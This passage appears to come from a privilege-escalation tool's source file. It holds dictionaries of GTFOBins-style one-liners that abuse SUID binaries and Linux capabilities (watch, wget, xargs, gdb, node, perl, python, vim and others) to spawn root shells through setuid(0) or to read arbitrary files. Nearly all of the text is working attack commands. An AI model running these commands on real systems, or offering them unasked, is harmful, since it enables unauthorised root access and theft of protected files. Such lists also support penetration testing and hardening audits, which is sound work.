    "watch": [
        {
            "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'",
        }
    ],
    "wc": [
        {
            "LFILE=file_to_read && ./wc --files0-from \"$LFILE\""
        }
    ],
    "wget": [
        {
            "TF=$(mktemp) && chmod +x $TF && echo -e '#!/bin/sh -p\ && /bin/sh -p 1>&0' >$TF && ./wget --use-askpass=$TF 0"
        }
    ],
    "whiptail": [
        {
            "LFILE=file_to_read && ./whiptail --textbox --scrolltext \"$LFILE\" 0 0"
        }
    ],
    "xargs": [
        {
            "./xargs -a /dev/null sh -p",
        }
    ],
    "xdotool": [
        {
            "./xdotool exec --sync /bin/sh -p"
        }
    ],
    "xmodmap": [
        {
            "LFILE=file_to_read && ./xmodmap -v $LFILE"
        }
    ],
    "xmore": [
        {
            "LFILE=file_to_read && ./xmore $LFILE"
        }
    ],
    "xxd": [
        {
            "LFILE=file_to_read && ./xxd \"$LFILE\" | xxd -r"
        }
    ],
    "xz": [
        {
            "LFILE=file_to_read && ./xz -c \"$LFILE\" | xz -d"
        }
    ],
    "yash": [
        {
            "./yash"
        }
    ],
    "zsh": [
        {
            "./zsh"
        }
    ],
    "zsoelim": [
        {
            "LFILE=file_to_read && ./zsoelim \"$LFILE\""
        }
    ]
}
# SUID_BINS_END

capabilities = {
    "gdb": [
        {
            "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit",
        }
    ],
    "node": [
        {
            "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
        }
    ],
    "perl": [
        {
            "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
        }
    ],
    "php": [
        {
            "CMD=\"/bin/sh\" && ./php -r \"posix_setuid(0); system('$CMD');\""
        }
    ],
    "python": [
        {
            "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
        }
    ],
    "ruby": [
        {
            "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
        }
    ],
    "rview": [
        {
            "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        }
    ],
    "rvim": [
        {
            "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        }
    ],
    "view": [
        {
            "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        }
    ],
    "vim": [
        {
            "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        }
    ],
    "vimdiff": [
        {
            "./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        }
    ]
}
# CAPABILITIES_END